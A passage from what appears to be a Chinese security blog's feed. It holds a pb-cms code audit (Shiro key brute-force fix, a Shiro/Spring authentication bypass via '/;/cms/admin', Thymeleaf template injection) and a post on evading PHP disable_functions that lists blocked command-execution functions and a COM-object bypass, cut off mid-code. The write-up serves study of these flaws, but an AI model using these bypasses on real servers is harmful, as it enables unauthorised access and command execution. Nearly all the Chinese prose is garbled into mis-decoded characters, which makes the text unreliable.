class="keyword">try</span> &#123;</span><br><span class="line">            keygen = KeyGenerator.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">SecretKey</span> <span class="variable">deskey</span> <span class="operator">=</span> keygen.generateKey();</span><br><span class="line">        System.out.println(Base64.encodeToString(deskey.getEncoded()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191318913.png" alt="image-20240319131852883"><br>æ¯æ¬¡è¿è¡Œéƒ½ä¼šå¾—åˆ°ä¸ä¸€æ ·çš„keyï¼Œç„¶åæˆ‘ä»¬æ›¿æ¢ä¸€ä¸‹keyçœ‹è¿˜èƒ½ä¸èƒ½çˆ†ç ´å‡ºæ¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319040.png" alt="image-20240319131900990"><br>å¯ä»¥çœ‹åˆ°çˆ†ç ´åˆ°å¤©è’åœ°è€ä¹Ÿæ²¡æ³•çˆ†å‡ºæ¥é™¤éåˆšå¥½å­—å…¸é‡Œé¢æœ‰è¿™ä¸ªkeyï¼Œæ‰€ä»¥ä¿®å¤ç”¨è¿™ç§æ–¹å¼å³å¯ï¼Œæ¯”å¦‚æˆ‘æŠŠåˆšåˆšé‚£ä¸ªå¯†é’¥åŠ åˆ°å­—å…¸é‡Œé¢å¯ä»¥çœ‹åˆ°å°±èƒ½çˆ†å‡ºæ¥äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319198.png" alt="image-20240319131913155"></p><h2 id="shiroæƒé™ç»•è¿‡"><a href="#shiroæƒé™ç»•è¿‡" class="headerlink" title="shiroæƒé™ç»•è¿‡"></a>shiroæƒé™ç»•è¿‡</h2><p>Shiro 1.5.3ç‰ˆæœ¬ä¹‹å‰ï¼Œå½“shiroå’Œspringbootä¸€èµ·ä½¿ç”¨æ—¶å¯èƒ½ä¼šå¯¼è‡´èº«ä»½éªŒè¯ç»•è¿‡<br>æ¼æ´çš„ä¸»è¦åŸå› å°±æ˜¯shiroå’Œspringå¯¹è·¯å¾„çš„è§£ææœ‰å·®å¼‚ï¼Œä¸‹é¢å¼€å§‹å¤ç°<br>æˆ‘ä»¬ç›´æ¥è®¿é—®<code>/cms/admin</code>æ—¶ä¼šè·³è½¬åˆ°ç™»å½•ç•Œé¢ï¼Œä½†æ˜¯å½“ä½¿ç”¨<code>/;/cms/admin</code>æ—¶å³å¯è·³è¿‡è®¤è¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319879.png" alt="image-20240319131920791"><br>è¿™ä¸ªè™½ç„¶ç»•è¿‡äº†ä½†æ˜¯æ²¡å•¥æƒé™ä»€ä¹ˆéƒ½å¹²ä¸äº†</p><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>è¿™ä¸ªæ´ä¹‹å‰æ²¡ç¢°è¿‡è·Ÿç€çœ‹ä¸‹ä»£ç <br><strong>shiro</strong><br>æ–­ç‚¹ä¸‹åœ¨<code>org/apache/shiro/web/filter/mgt/PathMatchingFilterChainResolver.java#getChain</code>è¿™é‡Œï¼Œç„¶åå¼€å§‹è°ƒè¯•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319368.png" alt="image-20240319131933115"><br>å¯ä»¥çœ‹åˆ°è¿™é‡Œé€šè¿‡<code>getPathWithinApplication()</code>æ–¹æ³•è·å–åˆ°çš„<code>requestURI</code>åªæœ‰ä¸€ä¸ª<code>/</code>è·Ÿè¿›å»åˆ†æä¸€ä¸‹ï¼Œæ¥åˆ°<code>getPathWithinApplication()</code>æ–¹æ³•ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319335.png" alt="image-20240319131941180"><br>å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨äº†<code>getRequestUri()</code>æ–¹æ³•å<code>requestUri</code>å°±å·²ç»å˜æˆäº†<code>/</code>æœ€åä¹Ÿå°±æ˜¯è¿”å›çš„è¿™ä¸ªï¼Œé‚£ä¹ˆç»§ç»­è·Ÿè¿›<code>getRequestUri()</code>æ–¹æ³•çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191319867.png" alt="image-20240319131956696"><br>ä»è¿™é‡Œçš„è‹±æ–‡æ³¨é‡Šä¸­å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½å°±æ˜¯æˆªå–åˆ†å·ä¹‹å‰çš„ä¸œè¥¿ï¼Œä½†æ˜¯è¿˜æ˜¯çœ‹ä¸€ä¸‹å…·ä½“çš„å¤„ç†é€»è¾‘ï¼Œè·Ÿè¿›<code>decodeAndCleanUriString()</code>æ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191320163.png" alt="image-20240319132012022"><br>è¿™é‡Œå¯ä»¥çœ‹åˆ°<code>uri.indexOf(&#39;;&#39;)</code>ä¼šè·å–åˆ°åˆ†å·çš„ä½ç½®ç„¶åèµ‹å€¼ç»™<code>semicolonIndex</code>æœ€åæˆªå–0åˆ°åˆ†å·çš„ä½ç½®çš„ä¸œè¥¿è¿”å›ï¼Œç„¶åç»§ç»­å¾€ä¸‹ï¼Œä¼šæ‹¿ç€<code>pathPattern</code>å»åŒ¹é…é‰´æƒè§„åˆ™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191320599.png" alt="image-20240319132021465"><br>ç„¶ååŒ¹é…ä¸ä¸Šè¿”å›null<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191320713.png" alt="image-20240319132028565"><br>å› ä¸ºä¸Šé¢è¿™é‡Œè¿”å›nullï¼Œå‰é¢åŒ¹é…ä¸ä¸Šè·¯å¾„å¯¹åº”çš„é‰´æƒæ¨¡å¼ï¼Œæ‰€ä»¥ä¸ä¼šè®¾ç½®åŒ¹é…åˆ°çš„é‰´æƒå¯¹äºçš„FIlterã€‚è·Ÿç€è°ƒç”¨<code>chain.doFilter</code>,ä»è€Œå®ç°ç»•è¿‡<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191320571.png" alt="image-20240319132049315"><br>è¿™é‡Œèµ°å®Œä¹‹åå°±ä¼šå»åˆ°springçš„urlå¤„ç†<br><strong>spring</strong><br>æ–­ç‚¹ä¸‹åœ¨<code>org.springframework.web.util.UrlPathHelper.java#getPathWithinServletMapping</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321074.png" alt="image-20240319132059770"><br>ç„¶åè°ƒè¯•ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321312.png" alt="image-20240319132113027"><br>è¿™é‡Œå¯ä»¥çœ‹åˆ°<code>getPathWithinApplication()</code>å¤„ç†ä¹‹å<code>pathWithinApp</code>å°±å·²ç»å˜ä¸ºäº†<code>/cms/admin</code>äº†æ‰€ä»¥è·Ÿè¿›ä¸Šé¢é‚£ä¸ªå‡½æ•°çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321605.png" alt="image-20240319132125424"><br>åˆ°è¿™é‡Œä¼¼ä¹å’Œshiroæ˜¯ä¸€æ ·çš„å‡½æ•°ï¼Œæ‰€ä»¥ç›´æ¥è·Ÿè¿›å»çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321898.png" alt="image-20240319132144687"><br>æ¥åˆ°è¿™é‡Œç»§ç»­è·Ÿè¿›<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191321827.png" alt="image-20240319132156670"><br>è¿™é‡Œä¸‰æ­¥å¯ä»¥çœ‹åˆ°å…ˆè¿‡æ»¤äº†åˆ†å·ç„¶åè¿‡æ»¤äº†é‡å¤çš„<code>/</code>å¾—åˆ°<code>/cms/admin</code>ï¼Œspringèƒ½æ­£å¸¸å¤„ç†è¿™ä¸ªurlæ‰€ä»¥å®ç°äº†ç»•è¿‡ï¼Œå¦‚æœæ²¡æœ‰åŠ åˆ†å·è¿™é‡Œå¾—åˆ°çš„å°±æ˜¯login<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191322841.png" alt="image-20240319132215600"><br>è¿™é‡Œçœ‹äº†å¾ˆå¤šåˆ†ææ–‡ç« ï¼Œæœ€ç»ˆçš„æ€»ç»“å°±æ˜¯urlè¿›å…¥tomcatåtomcatåˆ¤æ–­<code>/;/cms/admin</code>cmsä¸‹çš„adminï¼Œè¿›å…¥åˆ°shiroæ—¶<code>;</code>åé¢è¢«æˆªæ–­å˜ä¸º<code>/</code>ï¼Œç»•è¿‡é‰´æƒï¼Œæ­¤æ—¶å†è¿›å…¥springæ—¶åˆè¢«ç†è§£ä¸º<code>/cms/admin</code>æœ€ç»ˆå¯¼è‡´shiroæƒé™çš„ç»•è¿‡ï¼Œè¿™å—çœ‹äº†å¾ˆå¤šæ–‡ç« åªèƒ½å‹‰å¼ºç†è§£åˆ°è¿™é‡Œäº†ï¼Œå†æ·±å…¥æ„Ÿè§‰å¾—å»çœ‹shiroçš„é‰´æƒè§„åˆ™</p><h2 id="SSRFç»“åˆFastjson"><a href="#SSRFç»“åˆFastjson" class="headerlink" title="SSRFç»“åˆFastjson"></a>SSRFç»“åˆFastjson</h2><p>æ–°çŸ¥è¯†ç‚¹ï¼Œå­¦ä¹ ä¸€ä¸‹<br>ç™»å½•åå°å‘ç°æœ¬æ¥çš„åŠŸèƒ½æ˜¯è¿™æ ·çš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191322640.png" alt="image-20240319132227586"><br>ç„¶åæ¥åˆ°æ•°æ®åº“ä¸­<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191322952.png" alt="image-20240319132239913"><br>å‘ç°è¿™é‡Œå¤šäº†ä¸ªç‚¹ï¼Œä¸çŸ¥é“æ˜¯ä½œè€…æœ‰æ„è¿™æ ·å†™çš„è¿˜æ˜¯æ€ä¹ˆï¼Œå½“å»æ‰è¿™ä¸ªç‚¹åä¼šå‘ç°ä¸Šé¢é‚£ä¸ªæ–‡ç« åˆ—è¡¨å¤šäº†ä¸€ä¸ªåŠŸèƒ½ï¼Ÿè‡ªå·±å»å¼„äº†ä¸‹å‘ç°å¹¶æ²¡æœ‰å•Šï¼Œæ˜¯æˆ‘æ“ä½œæœ‰é—®é¢˜ï¼Ÿä¸çŸ¥é“è¿™ä¸ªwsyu9aå¸ˆå‚…æ€ä¹ˆå¼„çš„ï¼Œæœ¬æ¥æƒ³æ‰‹åŠ¨å­¦ä¹ ä¸€ä¸‹çš„ï¼Œæ— å¥ˆåªèƒ½çœ‹çœ‹äº†</p><h2 id="Thymeleafæ¨¡æ¿æ³¨å…¥æ¼æ´"><a href="#Thymeleafæ¨¡æ¿æ³¨å…¥æ¼æ´" class="headerlink" title="Thymeleafæ¨¡æ¿æ³¨å…¥æ¼æ´"></a>Thymeleafæ¨¡æ¿æ³¨å…¥æ¼æ´</h2><p>Thymeleafçš„æ¨¡æ¿æ³¨å…¥ä¹‹å‰æ²¡æ¥è§¦è¿‡ï¼Œä½†æ˜¯åº”è¯¥å’Œå…¶å®ƒçš„æ¨¡æ¿æ³¨å…¥å·®ä¸å¤šï¼Œè¿™ä¸ªæ´å·²ç»è¢«æäº†issues<br><a href="https://gitee.com/LinZhaoguan/pb-cms/issues/I51W2D">pb-cmså­˜åœ¨åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ Â· Issue #I51W2D Â· LinZhaoguan&#x2F;pb-cms - Gitee.com</a><br>è¿™é‡Œå…ˆçœ‹çœ‹å¼•èµ·æ¼æ´çš„æƒ…å†µ<br><strong>ç¬¬ä¸€ç§</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span>  lang ; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šï¼Œæ¨¡æ¿çš„è·¯å¾„å¯æ§ï¼Œè¿™é‡Œå¦‚æœè¾“å…¥çš„æ˜¯<code>/path?lang=en</code>å°±ä¼šå»å¯»æ‰¾en.htmlè¿™ä¸ªæ¨¡æ¿ï¼Œæ‰¾åˆ°å°±æ˜¾ç¤ºï¼Œæ²¡æ‰¾åˆ°å°±æŠ¥é”™ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬è¾“å…¥çš„æ˜¯spelè¡¨è¾¾å¼å°±ä¼šè¢«è§£ææ‰§è¡Œï¼Œæ‰€ä»¥è¿™ä¸ªæ¼æ´çš„æœ¬è´¨è¿˜æ˜¯spelè¡¨è¾¾å¼æ³¨å…¥ï¼Œå’Œsstiè¿˜æ˜¯ä¸ä¸€æ ·<br><strong>ç¬¬äºŒç§</strong><br>controlleræ— è¿”å›å€¼ï¼Œåˆ™ä»¥GetMappingçš„è·¯ç”±ä¸ºè§†å›¾åç§°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getDocument</span><span class="params">(<span class="meta">@PathVariable</span> String document)</span> &#123;  </span><br><span class="line">    log.info(<span class="string">&quot;Retrieving &quot;</span> + document);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç§å°±ä¸èƒ½æœ‰è¿”å›å€¼ï¼Œæœ‰äº†åè€Œä¸ä¼šå¯¼è‡´ä»£ç æ‰§è¡Œï¼Œè¿™ä¸ªè¦æ‰§è¡Œæ˜¯è¦è°ƒç”¨åˆ°<code>applyDefaultViewName</code>æ–¹æ³•ï¼Œé‡Œé¢ä¼šåˆ¤æ–­å½“<code>ModelAndView</code>ä¸ºç©ºï¼Œåˆ™é€šè¿‡<code>getDefaultViewName</code>è·å–è¯·æ±‚è·¯å¾„ä½œä¸º<code>ViewName</code>ï¼Œæ›´è¯¦ç»†çš„å°±ä¸çœ‹äº†ï¼Œè¿™ä¸ªæ¼æ´è¿˜æœ‰å¾…æ›´æ·±å…¥çš„å­¦ä¹ <br>å›å½’æ¼æ´ï¼Œå…ˆå¤ç°ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317109.png"><br>åœ¨ä¸»é¢˜ç®¡ç†è¿™é‡Œæ–°å¢ä¸ªä¸»é¢˜ï¼Œç„¶åå¯ç”¨è®¿é—®å‰å°å³å¯è§¦å‘<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317240.png"></p><h3 id="ä»£ç åˆ†æ-1"><a href="#ä»£ç åˆ†æ-1" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>æ¥åˆ°å¦‚ä¸‹ä½ç½®ä¸‹æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191037209.png"><br>å¯ä»¥çœ‹åˆ°è¿™é‡Œå’Œæˆ‘ä»¬ç¬¬ä¸€ç§æƒ…å†µçš„å†™æ³•åŸºæœ¬ä¸€æ ·ï¼Œè¿™é‡Œé€šè¿‡ï¼Œ<code>bizThemeService.selectCurrent().getName()</code>è·å–åˆ°æˆ‘ä»¬çš„è¾“å…¥ç„¶åè¿”å›é€ æˆäº†æ¨¡æ¿æ³¨å…¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317623.png"><br>æ„Ÿè§‰è¿™ä¸ªå®¡å‡ºæ¥ä¹ŸæŒºçŒ›ï¼Œä¸ºä»€ä¹ˆå°±èƒ½çœ‹å‡ºæ¥é‚£ä¸ªæ˜¯æˆ‘ä»¬åå°å¯æ§çš„å‘¢ï¼Ÿ<br>æˆ‘å°è¯•è‡ªå·±è·Ÿä¸€ä¸‹çœ‹çœ‹ï¼Œæ‰¾äº†åŠå¤©ç»ˆäºåœ¨ä¸‹é¢è¿™é‡Œæ‰¾æ‰“æ–°å¢ä¸»é¢˜äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317754.png"><br>è¿™ä¸ªæ—¶å€™å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„å‚æ•°å·²ç»è¢«ä¼ è¿›æ¥äº†ï¼Œå°±åœ¨<code>bizTheme</code>è¿™ä¸ªé‡Œé¢ï¼Œæ‰€ä»¥è¿˜å¾—ç»§ç»­å¾€å‰æ¨è¿›ï¼Œåœ¨è¿™ä¸ªBizThemeç±»ä¸‹æ‰¾åˆ°å®šä¹‰çš„å‚æ•°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202403191317633.png"><br>é‡Œé¢æœ‰ä¸ª<code>@Data</code>æ³¨è§£ç›¸å½“äºæœ‰getterå’Œsetteräº†å®ä¾‹åŒ–çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨èµ‹å€¼äº†ï¼Œç„¶åç»“åˆä¸Šé¢çš„<code>@PostMapping</code>æ³¨è§£å³å¯ç†è§£ä¸ºå¯æ§ï¼Œçœ‹çœ‹GPTæ€ä¹ˆè¯´çš„ï¼Œæ ¹æ®Spring MVCçš„å·¥ä½œåŸç†ï¼Œå½“æ¥æ”¶åˆ°ä¸€ä¸ªPOSTè¯·æ±‚æ—¶ï¼ŒSpringä¼šå°è¯•å°†è¯·æ±‚ä½“ä¸­çš„æ•°æ®æ˜ å°„åˆ°æ–¹æ³•çš„å‚æ•°ä¸Šï¼Œæ‰€ä»¥è¿™é‡Œå¯æ§</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç¨å¾®å­¦ä¹ äº†ä¸€ä¸‹æ–°æ´ï¼Œåé¢è¿˜æœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ ä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘æ‰¾çš„æ¥å£ä¸å¯¹æ²¡èƒ½åˆ©ç”¨æˆåŠŸï¼Œæƒ³å­¦ä¹ çš„å¸ˆå‚…å¯ä»¥å‚è€ƒ<a href="https://gitee.com/LinZhaoguan/pb-cms/issues/I8T4WR">File upload vulnerability Â· Issue #I8T4WR Â· LinZhaoguan&#x2F;pb-cms - Gitee.com</a><br>è¿™ä¸ªissueè‡ªå·±å»ç†è§£ä¸€ä¸‹</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://tttang.com/archive/1592/">https://tttang.com/archive/1592/</a><br><a href="https://wsyu9a.github.io/blog/2024/03/05/240304PB-CMS/">https://wsyu9a.github.io/blog/2024/03/05/240304PB-CMS/</a><br><a href="https://www.cnblogs.com/TT0TT/p/16845759.html">æ¨¡æ¿æ³¨å…¥â€“Spring boot Thymeleaf æ¨¡æ¿æ³¨å…¥ - TT0TT - åšå®¢å›­ (cnblogs.com)</a><br><a href="https://xz.aliyun.com/t/10514">https://xz.aliyun.com/t/10514</a></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>disable_functionsç»•è¿‡æ€»ç»“</title>
      <link href="/2023/12/disable-functions%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
      <url>/2023/12/disable-functions%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="é»‘åå•ç»•è¿‡ï¼ˆå¸¸è§„æ‰‹æ®µï¼‰"><a href="#é»‘åå•ç»•è¿‡ï¼ˆå¸¸è§„æ‰‹æ®µï¼‰" class="headerlink" title="é»‘åå•ç»•è¿‡ï¼ˆå¸¸è§„æ‰‹æ®µï¼‰"></a>é»‘åå•ç»•è¿‡ï¼ˆå¸¸è§„æ‰‹æ®µï¼‰</h2><p>è¿™ä¸ªç»•è¿‡å°±æ˜¯åˆ©ç”¨é»‘åå•ä¹‹å¤–çš„å‡½æ•°å»æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯æˆ‘åœ¨æµ‹è¯•è¿™ä¸ªé»‘åå•ç»•è¿‡çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªå¾ˆè¿·æƒ‘çš„ç‚¹ï¼Œåœ¨Windowsä¸‹æˆ‘ç¦ç”¨äº†evalå’Œsystemå‡½æ•°hackbarç¡®å®ä¸èƒ½æ‰§è¡Œsystemå‡½æ•°äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061648901.png" alt="image-20231206164832783"><br>ä½†æ˜¯èšå‰‘ä¸Šé¢ä»»ç„¶å¯ä»¥å‘½ä»¤æ‰§è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061649793.png" alt="image-20231206164914744"><br>å¦å¤–evalå‡½æ•°ä¹Ÿä»»ç„¶å¯ä»¥æ‰§è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061649600.png" alt="image-20231206164939494"><br>å²‚ä¸æ˜¯ç›¸å½“äºç¦ç”¨evalå‡½æ•°æ²¡ç”¨ï¼Ÿï¼Ÿè¿™ä¸ªæ—¶å€™çš„phpç‰ˆæœ¬ä¸º5.4.45ï¼Œç„¶åæ˜¯Linuxä¸‹çš„æµ‹è¯•ï¼Œæˆ‘ä¹Ÿç¦ç”¨äº†evalã€systemåšæµ‹è¯•ï¼Œevalå‡½æ•°ç…§æ ·æ­£å¸¸æ‰§è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061649382.png" alt="image-20231206164953272"><br>ç„¶åå°è¯•systemå‡½æ•°<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061650540.png" alt="image-20231206165006450"><br>ç„¶åå°è¯•ç”¨ä»¥èšå‰‘å»æ‰§è¡Œå‘½ä»¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061650970.png"><br>èšå‰‘è¿˜æ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œå‘½ä»¤ï¼Œç„¶åæˆ‘å†ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹ç»å¸¸ç¦æ‰çš„å‡½æ•°å…¨éƒ¨åŠ ä¸Šå»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec,passthru,popen,shell_exec,proc_open,proc_terminate,curl_exec,curl_multi_exec,show_source,touch,escapeshellcmd,escapeshellarg,<span class="keyword">eval</span>,system</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶èšå‰‘æ— æ³•æ­£å¸¸å‘½ä»¤æ‰§è¡Œäº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061650948.png"><br>ç„¶åæˆ‘åœ¨Windowsä¸‹ä¹ŸåŠ ä¸Šé‚£ä¸€å †å‡½æ•°ï¼Œç„¶åèšå‰‘æ­¤æ—¶ä¹Ÿæ— æ³•æ­£å¸¸å‘½ä»¤æ‰§è¡Œäº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061650485.png" alt="image-20231206165049441"><br>ç„¶åæŠŠsystemæ”¾å‡ºæ¥ä¹‹åå¯ä»¥æ­£å¸¸æ‰§è¡Œå‘½ä»¤ï¼Œæ­¤æ—¶å°±çŒœæµ‹èšå‰‘çš„é‚£ä¸ªç»ˆç«¯çš„å‘½ä»¤æ‰§è¡Œå½“systemç”¨ä¸äº†çš„æ—¶å€™ä¼šå»å°è¯•ç”¨å…¶å®ƒçš„å‡½æ•°æ‰§è¡Œå‘½ä»¤ï¼Œåº”è¯¥æ˜¯å†…ç½®äº†ä¸€å †å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ï¼Œæ²¡æœ‰ç ”ç©¶è¿‡èšå‰‘çš„æºç ï¼Œä½†æ˜¯æˆ‘è§‰å¾—æˆ‘çš„çŒœæµ‹å…«ä¹ä¸ç¦»åï¼Œä½†æ˜¯å¯¹äºé‚£ä¸ªevalå‡½æ•°çš„ç¦ç”¨è¿˜æ˜¯æ²¡æ‡‚ä¸ºä»€ä¹ˆç¦ç”¨ä¸äº†ï¼Œéš¾é“æ˜¯å› ä¸ºæ— æ³•åšå‘½ä»¤æ‰§è¡Œåªèƒ½æ‰§è¡ŒæŸä¸ªå‡½æ•°æ‰€ä»¥ä¸é™åˆ¶ï¼Ÿï¼Ÿ<br>ä¸Šé¢çš„ç–‘æƒ‘ç»“æŸï¼Œè¿™ä¸ªéƒ¨åˆ†çš„é»‘åå•ç»•è¿‡ä¹Ÿå°±æ˜¯æ‰¾ä¸€äº›æ²¡æœ‰è¢«åŠæ‰å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°ï¼Œå½“ç„¶åªèƒ½åˆ©ç”¨hackbaråœ¨ç½‘é¡µä¸Šæ‰§è¡Œï¼Œå› ä¸ºèšå‰‘é‡Œé¢ä¸ä¸€å®šå†…ç½®äº†é‚£ä¸ªå‡½æ•°æ— æ³•ä½¿ç”¨ç»ˆç«¯å»æ‰§è¡Œå‘½ä»¤ï¼Œå‚è€ƒ<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">l3m0n&#x2F;Bypass_Disable_functions_Shell: ä¸€ä¸ªå„ç§æ–¹å¼çªç ´Disable_functionsè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„shell (github.com)</a>è¯¥é¡¹ç›®ï¼Œä¸€èˆ¬çš„ç¦ç”¨åˆ—è¡¨å¦‚ä¸‹ï¼Œå¯ä»¥ä»è¿™ä¸ªé‡Œé¢æ‰¾æ¼ç½‘ä¹‹é±¼ï¼Œå¦‚æœæœ‰å†å»æ‰¾å‡½æ•°çš„è¯¦ç»†ç”¨æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬ç›´æ¥å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°å°±ä¸‹é¢å‡ ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execã€shell_execã€systemã€passthruã€popenã€proc_open</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨Windowsç»„ä»¶COMç»•è¿‡"><a href="#åˆ©ç”¨Windowsç»„ä»¶COMç»•è¿‡" class="headerlink" title="åˆ©ç”¨Windowsç»„ä»¶COMç»•è¿‡"></a>åˆ©ç”¨Windowsç»„ä»¶COMç»•è¿‡</h2><h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ul><li>phpinfo()ä¸­èƒ½æœåˆ°com.allow_dcomï¼Œå³åšäº†é…ç½®ï¼Œé»˜è®¤æ²¡åš<br>è¿™ä¸ªç»„ä»¶é»˜è®¤æ˜¯æ²¡æœ‰åšé…ç½®çš„<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061651807.png" alt="image-20231206165114747"><br>éœ€è¦åŠ ä¸Š<code>extension=php_com_dotnet.dll</code>ï¼Œç„¶åå°†<code>com.allow_dcom = true</code>å‰é¢çš„åˆ†å·å»æ‰<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061651356.png" alt="image-20231206165131300"><br>è¿™æ ·é…ç½®åå³å¯åœ¨phpinfoä¸­æœåˆ°<code>com.allow_dcom</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061651232.png" alt="image-20231206165142182"><br>å¦‚æœä¸€å°WindowsæœåŠ¡å™¨åšäº†è¿™ä¸ªé…ç½®ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥ç»•è¿‡ï¼Œå³åˆ›å»ºä¸€ä¸ªCOMå¯¹è±¡,é€šè¿‡è°ƒç”¨COMå¯¹è±¡çš„<code>exec</code>æ›¿æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼Œä¸Šä¼ å¦‚ä¸‹ä»£ç å³å¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061651556.png" alt="image-20231206165154479"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 